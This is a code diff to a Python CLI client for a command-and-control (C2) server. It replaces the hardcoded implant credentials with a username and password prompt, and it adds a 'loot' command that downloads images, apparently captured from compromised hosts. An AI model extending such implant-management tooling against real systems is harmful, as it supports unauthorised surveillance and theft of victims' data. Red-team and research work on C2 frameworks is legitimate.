@@ -4,8 +4,9 @@ import os
 
 def login(server_url):
     try:
-        secret = "e7bcc0ba5fb1dc9cc09460baaa2a6986"  # Replace with actual secret key input
-        response = requests.post(f'{server_url}/login', json={'implantID': '47e040dd-cd6b-4463-a8de-00423b8b9c21', 'secret': secret})
+        username = input("Enter the username: ")
+        password = input("Enter the password: ")
+        response = requests.post(f'{server_url}/profile/login', json={'username': username, 'password': password})
         response.raise_for_status()
         return response.json().get('access_token')
     except requests.exceptions.RequestException as e:
@@ -31,6 +32,26 @@ def get_results(server_url, access_token):
     except requests.exceptions.RequestException as e:
         print(f"Failed to retrieve results: {e}")
         return None
+    
+def get_image(server_url, access_token, task_id):
+    try:
+        headers = {'Authorization': f'Bearer {access_token}'}
+        response = requests.get(f'{server_url}/get_image?task_id={task_id}', headers=headers)
+        response.raise_for_status()
+
+        if 'image' not in response.headers.get('content-type', ''):
+            print("Server did not return an image.")
+            return None
+
+        save_path = f"images/{task_id}.png"  # Adjust the save path as needed
+        with open(save_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=1024):
+                if chunk:
+                    f.write(chunk)
+        return save_path
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to retrieve image: {e}")
+        return None
 
 def main():
     parser = argparse.ArgumentParser(description="A Python CLI to interact with the C2-server.")
@@ -38,7 +59,7 @@ def main():
     parser.add_argument(
         'action',
         nargs='?',
-        choices=['implants', 'tasks', 'results'],
+        choices=['implants', 'tasks', 'results', 'loot'],
         help='Action to perform. Currently, only "implants" is supported to get a list of registered implants.'
     )
     
@@ -73,6 +94,12 @@ def main():
                     results = get_results(args.server_url, access_token)
                     if results:
                         print(results)
+            elif args.action == 'loot':
+                if access_token:
+                    args.task_id = input("Enter the task ID: ")
+                    results = get_image(args.server_url, access_token, args.task_id)
+                    if results:
+                        print("the path is for the saved img is "+results)
             else:
                 if args.action != 'exit':
                     print(f"Unknown command '{args.action}'. Please enter a valid command.")
